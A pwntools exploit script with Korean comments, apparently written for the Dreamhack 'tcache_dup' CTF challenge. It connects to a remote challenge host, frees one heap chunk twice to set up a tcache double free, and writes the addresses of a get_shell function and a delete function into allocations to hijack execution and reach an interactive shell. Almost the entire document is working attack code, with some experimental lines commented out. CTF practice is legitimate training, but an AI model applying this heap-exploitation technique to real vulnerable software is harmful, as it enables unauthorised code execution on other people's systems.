# 10번까지 할당 가능한 문제

from pwn import *

#p = process("./tcache_dup")
p = remote("host1.dreamhack.games", 13642)
e = ELF("./tcache_dup")
libc = ELF("libc-2.27.so")

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def delete(index):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(index))

create(0x30, "aaaa")
delete(0)
delete(0)
#tcachebins 리스트에 2개의 청크 연결

addr_stdout = e.symbols["stdout"]
libc_base = 0x7FFFF7D88000
stdout = libc_base + libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
get_shell = 0x400ab0
addr_delete = 0x400a3a
#create(0x30, p64(free_hook))
#create(0x30, p64(free_hook))
create(0x30, p64(addr_delete))
create(0x30, p64(get_shell))
#create(0x30, p64(get_shell))
#delete(2)

p.interactive()